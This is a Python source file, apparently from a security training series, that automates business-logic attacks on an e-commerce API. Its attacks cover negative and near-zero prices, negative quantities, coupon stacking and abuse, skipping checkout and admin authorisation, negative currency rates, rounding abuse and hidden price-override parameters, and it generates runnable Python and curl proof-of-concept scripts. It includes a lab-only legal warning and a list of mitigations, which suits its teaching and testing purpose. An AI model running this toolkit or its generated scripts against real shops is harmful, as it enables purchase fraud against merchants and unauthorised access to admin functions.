#!/usr/bin/env python3
"""
Business Logic Exploitation Toolkit
Project #33: Business Logic & Rate Limiting Bypass

LEGAL: Only test your own apps, OWASP Juice Shop, or PortSwigger labs.
"""

import sys
import os
import re
import json
import time
import argparse
import datetime
import urllib3
from urllib.parse import urljoin, urlencode

import requests

from logic_payloads import (
    PRICE_PAYLOADS, QUANTITY_PAYLOADS, COUPON_PAYLOADS,
    WORKFLOW_ENDPOINTS, CURRENCY_BYPASS, HIDDEN_PARAMS,
    SUCCESS_INDICATORS, FAILURE_INDICATORS,
    python_poc, curl_poc,
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Colors:
    GREEN   = '\033[92m'
    RED     = '\033[91m'
    YELLOW  = '\033[93m'
    BLUE    = '\033[94m'
    CYAN    = '\033[96m'
    MAGENTA = '\033[95m'
    BOLD    = '\033[1m'
    RESET   = '\033[0m'

class BusinessLogicToolkit:
    def __init__(self, target, timeout=10, delay=0.2,
                 output_dir='.', verbose=False):
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        self.target = target
        self.timeout = timeout
        self.delay = delay
        self.output_dir = output_dir
        self.verbose = verbose

        os.makedirs(f"{output_dir}/logic_pocs", exist_ok=True)

        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0 Logic Tool'})

        self.results = {
            'target': target,
            'timestamp': datetime.datetime.now().isoformat(),
            'vulnerable': False,
            'findings': [],
            'pocs': [],
            'error': None,
        }

    def _req(self, url, method='GET', params=None, data=None):
        time.sleep(self.delay)
        try:
            if method.upper() == 'POST':
                return self.session.post(url, json=data or params,
                                          timeout=self.timeout, verify=False)
            return self.session.get(url, params=params,
                                     timeout=self.timeout, verify=False)
        except Exception as e:
            if self.verbose:
                print(f"{Colors.YELLOW}[!] {str(e)[:60]}{Colors.RESET}")
            return None

    def _add_finding(self, category, payload, response, detail=''):
        finding = {
            'category': category,
            'payload': str(payload),
            'status_code': response.status_code if response else None,
            'response_excerpt': (response.text[:300] if response else ''),
            'detail': detail,
        }
        self.results['findings'].append(finding)
        self.results['vulnerable'] = True

    def _is_success(self, r):
        """Check for common failure markers — if none, consider it possibly exploitable."""
        if not r:
            return False
        if r.status_code not in (200, 201, 202):
            return False
        text_lower = r.text.lower()
        for pattern in FAILURE_INDICATORS:
            if re.search(pattern, text_lower):
                return False
        return True

    # ------------------------------------------------------------------ #
    def phase1_price(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[📊] PHASE 1: PRICE MANIPULATION{Colors.RESET}")
        url = urljoin(self.target, '/api/buy')

        for name, price in PRICE_PAYLOADS.items():
            r = self._req(url, 'GET', params={'price': price, 'qty': '1'})
            if self._is_success(r):
                try:
                    body = r.json()
                    total = body.get('total')
                except Exception:
                    total = '?'

                # Check if the total is suspicious
                if isinstance(total, (int, float)):
                    if total < 0:
                        print(f"      {Colors.RED}[+]{Colors.RESET} [{name:18}] "
                              f"NEGATIVE TOTAL: {total}")
                        self._add_finding('price_manipulation', price, r,
                                          f'total={total}')
                    elif total < 1:
                        print(f"      {Colors.RED}[+]{Colors.RESET} [{name:18}] "
                              f"NEAR-ZERO TOTAL: {total}")
                        self._add_finding('price_manipulation', price, r,
                                          f'total={total}')
                    else:
                        print(f"      {Colors.YELLOW}[~]{Colors.RESET} [{name:18}] "
                              f"total={total}")
                else:
                    print(f"      {Colors.YELLOW}[~]{Colors.RESET} [{name:18}] "
                          f"HTTP {r.status_code}")

    # ------------------------------------------------------------------ #
    def phase2_quantity(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[📊] PHASE 2: QUANTITY BYPASS{Colors.RESET}")
        # Reset cart
        self._req(urljoin(self.target, '/api/cart/1/reset'))

        url = urljoin(self.target, '/api/cart/1/add')
        for name, qty in QUANTITY_PAYLOADS.items():
            self._req(urljoin(self.target, '/api/cart/1/reset'))
            r = self._req(url, 'GET',
                          params={'product_id': '1', 'qty': qty, 'price': '100'})
            if self._is_success(r):
                try:
                    body = r.json()
                    subtotal = body.get('item', {}).get('subtotal')
                    total = body.get('cart_total')
                except Exception:
                    subtotal = total = '?'

                if isinstance(subtotal, (int, float)):
                    if subtotal < 0:
                        print(f"      {Colors.RED}[+]{Colors.RESET} [{name:14}] "
                              f"NEGATIVE SUBTOTAL: {subtotal}")
                        self._add_finding('quantity_bypass', qty, r,
                                          f'subtotal={subtotal}')
                    elif subtotal == 0:
                        print(f"      {Colors.RED}[+]{Colors.RESET} [{name:14}] "
                              f"FREE ITEM (subtotal=0)")
                        self._add_finding('quantity_bypass', qty, r,
                                          f'subtotal={subtotal}')
                    elif subtotal < 1:
                        print(f"      {Colors.RED}[+]{Colors.RESET} [{name:14}] "
                              f"NEAR-ZERO: {subtotal}")
                        self._add_finding('quantity_bypass', qty, r,
                                          f'subtotal={subtotal}')
                    else:
                        print(f"      {Colors.YELLOW}[~]{Colors.RESET} [{name:14}] "
                              f"subtotal={subtotal}")
                else:
                    print(f"      {Colors.YELLOW}[~]{Colors.RESET} [{name:14}] "
                          f"HTTP {r.status_code}")

    # ------------------------------------------------------------------ #
    def phase3_coupon(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[📊] PHASE 3: COUPON ABUSE{Colors.RESET}")
        url = urljoin(self.target, '/api/apply-coupon')

        # Reset
        self._req(urljoin(self.target, '/api/cart/1/reset'))

        # Test stacking — apply same coupon multiple times
        print(f"      Testing coupon stacking (same code 5×)...")
        for i in range(5):
            r = self._req(url, 'GET', params={'code': 'SAVE10'})
            if self._is_success(r):
                try:
                    total = r.json().get('cart_total')
                except Exception:
                    total = '?'
                print(f"        Apply #{i+1}: cart_total={total}")

        # Test admin coupon
        print(f"      Testing admin coupon (ADMIN100)...")
        r = self._req(url, 'GET', params={'code': 'ADMIN100'})
        if self._is_success(r):
            try:
                total = r.json().get('cart_total')
            except Exception:
                total = '?'
            print(f"        {Colors.RED}[+]{Colors.RESET} ADMIN100 accepted! "
                  f"cart_total={total}")
            self._add_finding('coupon_abuse', 'ADMIN100', r, f'total={total}')

        # Expired coupon
        print(f"      Testing expired coupon (EXPIRED2020)...")
        r = self._req(url, 'GET', params={'code': 'EXPIRED2020'})
        if self._is_success(r):
            print(f"        {Colors.RED}[+]{Colors.RESET} EXPIRED2020 accepted!")
            self._add_finding('coupon_abuse', 'EXPIRED2020', r)

        # Self referral
        print(f"      Testing self-referral (REFER_SELF)...")
        r = self._req(url, 'GET', params={'code': 'REFER_SELF'})
        if self._is_success(r):
            print(f"        {Colors.RED}[+]{Colors.RESET} Self-referral accepted!")
            self._add_finding('coupon_abuse', 'REFER_SELF', r)

    # ------------------------------------------------------------------ #
    def phase4_workflow(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[📊] PHASE 4: WORKFLOW BYPASS{Colors.RESET}")

        for name, endpoint in WORKFLOW_ENDPOINTS.items():
            url = urljoin(self.target, endpoint)
            r = self._req(url, 'GET')
            if self._is_success(r):
                print(f"      {Colors.RED}[+]{Colors.RESET} [{name:20}] "
                      f"HTTP {r.status_code} (no auth required)")
                self._add_finding('workflow_bypass', endpoint, r)
            else:
                if r:
                    print(f"      {Colors.GREEN}[✓]{Colors.RESET} [{name:20}] "
                          f"HTTP {r.status_code}")

    # ------------------------------------------------------------------ #
    def phase5_currency(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[📊] PHASE 5: CURRENCY / ROUNDING{Colors.RESET}")
        url = urljoin(self.target, '/api/convert')

        # Attacker-controlled rate
        r = self._req(url, 'GET',
                      params={'amount': '100', 'currency': 'IDR', 'rate': '15000'})
        if r and r.status_code == 200:
            try:
                body = r.json()
                print(f"      {Colors.YELLOW}[~]{Colors.RESET} 100 USD → "
                      f"{body.get('converted')} {body.get('currency')}")
            except Exception:
                pass

        # Negative rate
        r = self._req(url, 'GET',
                      params={'amount': '100', 'currency': 'USD', 'rate': '-1'})
        if self._is_success(r):
            try:
                body = r.json()
                converted = body.get('converted')
                if isinstance(converted, (int, float)) and converted < 0:
                    print(f"      {Colors.RED}[+]{Colors.RESET} Negative rate accepted: "
                          f"converted={converted}")
                    self._add_finding('currency_bypass', 'rate=-1', r,
                                      f'converted={converted}')
            except Exception:
                pass

        # Rounding abuse — 0.001 rounds to 0
        r = self._req(url, 'GET',
                      params={'amount': '0.001', 'currency': 'USD', 'rate': '1'})
        if r and r.status_code == 200:
            try:
                body = r.json()
                converted = body.get('converted')
                if isinstance(converted, (int, float)) and converted < 1:
                    print(f"      {Colors.RED}[+]{Colors.RESET} Rounding abuse: "
                          f"0.001 → {converted}")
                    self._add_finding('currency_bypass', 'amount=0.001', r,
                                      f'converted={converted}')
            except Exception:
                pass

    # ------------------------------------------------------------------ #
    def phase6_hidden_params(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[📊] PHASE 6: PARAMETER TAMPERING{Colors.RESET}")
        url = urljoin(self.target, '/api/buy')

        for name, val in HIDDEN_PARAMS.items():
            params = {'price': '999', 'qty': '1', name: val}
            r = self._req(url, 'GET', params=params)
            if self._is_success(r):
                try:
                    body = r.json()
                    total = body.get('total')
                except Exception:
                    total = '?'
                if name in ('price', 'cost') and isinstance(total, (int, float)) and total < 999:
                    print(f"      {Colors.RED}[+]{Colors.RESET} [{name}={val}] "
                          f"total={total} (price override)")
                    self._add_finding('parameter_tampering',
                                      f'{name}={val}', r, f'total={total}')

    # ------------------------------------------------------------------ #
    def phase7_pocs(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[📊] PHASE 7: POC GENERATION{Colors.RESET}")

        pocs = [
            ('price_negative', '/api/buy', 'GET',
             {'price': '-100', 'qty': '1'},
             'Negative price manipulation'),
            ('qty_negative', '/api/cart/1/add', 'GET',
             {'product_id': '1', 'qty': '-1', 'price': '100'},
             'Negative quantity'),
            ('coupon_stack', '/api/apply-coupon', 'GET',
             {'code': 'SAVE10'},
             'Coupon stacking'),
            ('workflow_skip', '/api/checkout', 'GET',
             {}, 'Skip payment step'),
            ('admin_direct', '/api/admin/users', 'GET',
             {}, 'Direct admin API access'),
            ('currency_neg', '/api/convert', 'GET',
             {'amount': '100', 'currency': 'USD', 'rate': '-1'},
             'Negative currency rate'),
        ]

        for name, path, method, data, desc in pocs:
            url = urljoin(self.target, path)

            py_content = python_poc(url, method, data, desc)
            py_path = f"{self.output_dir}/logic_pocs/poc_{name}.py"
            with open(py_path, 'w') as f:
                f.write(py_content)
            os.chmod(py_path, 0o755)

            sh_content = curl_poc(url, method, data, desc)
            sh_path = f"{self.output_dir}/logic_pocs/poc_{name}.sh"
            with open(sh_path, 'w') as f:
                f.write(sh_content)
            os.chmod(sh_path, 0o755)

            print(f"      {Colors.GREEN}✓{Colors.RESET} poc_{name}.py")
            print(f"      {Colors.GREEN}✓{Colors.RESET} poc_{name}.sh")

            self.results['pocs'].append({
                'name': name, 'python': py_path, 'shell': sh_path,
            })

    # ------------------------------------------------------------------ #
    def save_reports(self):
        ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
        json_path = f"{self.output_dir}/logic_report_{ts}.json"
        with open(json_path, 'w') as f:
            json.dump(self.results, f, indent=2, default=str)
        print(f"\n{Colors.GREEN}[✓] JSON report: {json_path}{Colors.RESET}")

    def print_summary(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}[📊] EXPLOITATION SUMMARY{Colors.RESET}")
        print(f"    Vulnerability:  Business Logic Flaws")
        print(f"    Findings:       {len(self.results['findings'])}")
        print(f"    PoCs generated: {len(self.results['pocs'])}")

        sev_color = Colors.RED if self.results['vulnerable'] else Colors.GREEN
        sev = 'HIGH to CRITICAL' if self.results['vulnerable'] else 'LOW'
        print(f"    Severity:       {sev_color}{sev}{Colors.RESET}")

        # Category breakdown
        cats = {}
        for f in self.results['findings']:
            cats[f['category']] = cats.get(f['category'], 0) + 1
        if cats:
            print(f"\n    Findings by category:")
            for cat, n in sorted(cats.items(), key=lambda x: -x[1]):
                print(f"        - {cat}: {n}")

        print(f"\n    {Colors.YELLOW}Mitigation:{Colors.RESET}")
        print(f"        1. Server-side validation (all inputs)")
        print(f"        2. Positive number enforcement")
        print(f"        3. Range validation (min/max)")
        print(f"        4. Workflow state validation")
        print(f"        5. Coupon atomicity (single use)")
        print(f"        6. Currency validation (whitelist)")
        print(f"        7. Idempotency keys")

    def run(self):
        print("\n" + "=" * 70)
        print(f"{Colors.BOLD}{Colors.MAGENTA}Business Logic Exploitation Toolkit{Colors.RESET}")
        print("=" * 70)
        print(f"{Colors.BOLD}Target: {self.target}{Colors.RESET}")

        self.phase1_price()
        self.phase2_quantity()
        self.phase3_coupon()
        self.phase4_workflow()
        self.phase5_currency()
        self.phase6_hidden_params()
        self.phase7_pocs()

        self.print_summary()
        self.save_reports()

def main():
    p = argparse.ArgumentParser(
        description="Business Logic Exploitation Toolkit (Project #33)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python business_logic.py "http://localhost:7000"
  python business_logic.py "http://localhost:7000" --verbose
        """
    )
    p.add_argument('url', help='Target URL')
    p.add_argument('--timeout', type=int, default=10)
    p.add_argument('--delay', type=float, default=0.2)
    p.add_argument('-o', '--output', default='.')
    p.add_argument('-v', '--verbose', action='store_true')

    args = p.parse_args()

    print(f"{Colors.CYAN}{Colors.BOLD}")
    print("=" * 70)
    print("  BUSINESS LOGIC EXPLOITATION")
    print("  Project #33: Business Logic & Rate Limiting Bypass")
    print("=" * 70)
    print(f"{Colors.RESET}")
    print(f"{Colors.YELLOW}⚠️  Legal: Only test your own apps, OWASP Juice Shop, or PortSwigger labs.{Colors.RESET}\n")

    toolkit = BusinessLogicToolkit(
        target=args.url,
        timeout=args.timeout,
        delay=args.delay,
        output_dir=args.output,
        verbose=args.verbose,
    )
    toolkit.run()

if __name__ == '__main__':
    main()